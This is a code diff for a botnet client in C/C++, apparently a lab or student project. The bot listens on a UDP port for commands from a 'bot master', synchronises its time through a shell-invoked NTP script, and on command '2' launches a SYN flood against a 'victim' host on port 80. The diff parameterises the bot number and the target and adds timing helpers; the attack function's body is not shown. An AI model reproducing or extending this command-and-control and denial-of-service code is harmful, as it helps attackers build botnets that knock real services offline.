@@ -4,7 +4,6 @@
 #include <string.h>
 #include <stdlib.h>
 #include <math.h>
-#include <time.h>
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
@@ -13,32 +12,65 @@
 #include <netinet/tcp.h>
 #include <arpa/inet.h>
 #include <errno.h>
-#include <time.h>
+#include <sys/time.h>
+#include "BotProtocol.h"
 
 using namespace std;
 
+int botNo = 1;
 // 96 bit (12 bytes) pseudo header needed for tcp header checksum calculation 
-struct pseudo_header
-{
-    u_int32_t source_address;
-    u_int32_t dest_address;
-    u_int8_t placeholder;
-    u_int8_t protocol;
-    u_int16_t tcp_length;
-};
 
 unsigned short csum(unsigned short *,int);
 void parseCommand(char []);
 void synAttack(string, int, string, int, int);
 
+void getOffset(){
+  char line[256];
+  char fileName[256];
+  sprintf(fileName,"bot%d_offset",botNo);
+  ifstream myfile (fileName);
+  if (myfile.is_open())
+  {
+    while (myfile.getline(line,256))
+    {
+      cout << line << '\n';
+    }
+    myfile.close();
+  }
+
+  else cout << "Unable to open file"; 
+}
+
+int get_current_time(){
+    char cBuffer[100];
+    time_t zaman;
+    struct tm *ltime;
+    static struct timeval _t;
+    static struct timezone tz;
+
+    time(&zaman);
+    ltime = (struct tm *) localtime(&zaman);
+    gettimeofday(&_t, &tz);
+
+    strftime(cBuffer,40,"%d.%m.%y %H:%M:%S",ltime);
+    sprintf(cBuffer, "%s.%d", cBuffer,(int)_t.tv_usec);
+    printf("current time %s \n",cBuffer);
+}
+int print_time(){
+
+    get_current_time();
+    usleep(1000);
+    get_current_time();
+}
 int main(void)
 {
-	int botNo = 1;
+	
 	char messageBuffer[1024];
 	int messageBufferSize = sizeof(messageBuffer);
 	int UDPSocket;     // Socket connected to UDP;
-	int UDPPort = 20000;  // UPD port used to reveive the command from bot master;
+	int UDPPort = botsPort[botNo-1];  // UPD port used to reveive the command from bot master;
 
+    print_time();
 	cout << "Bort "<< botNo << " started" << endl << endl;	
 
 	// Create a UDP socket to receive the commands from bot master;
@@ -79,15 +111,18 @@ void parseCommand(char command[])
 
     if (command[0] == '1')
     {
-        cout << "Time syncronizing...";
+        cout << "Time syncronizing..." << endl;
         // Time syncronize coding;
-        system("python ntp_client.py > bot1_offset; echo -n offset; cat bot1_offset");
+        char cmd[256];
+        sprintf(cmd,"python ntp_client.py > bot%d_offset; echo -n offset; cat bot1_offset", botNo);
+        cout << "Run shell command:" << endl << cmd << endl;
+        system(cmd);
         cout << "Done" << endl;
     }
     else if (command[0] == '2')
     {
         cout << "SYN attacking..." << endl;
-        synAttack("192.168.15.128", 22000, "192.168.15.128", 80, 3);
+        synAttack(victim, 22000, victim, 80, 3);
         cout << "Done" << endl;
     }
     else
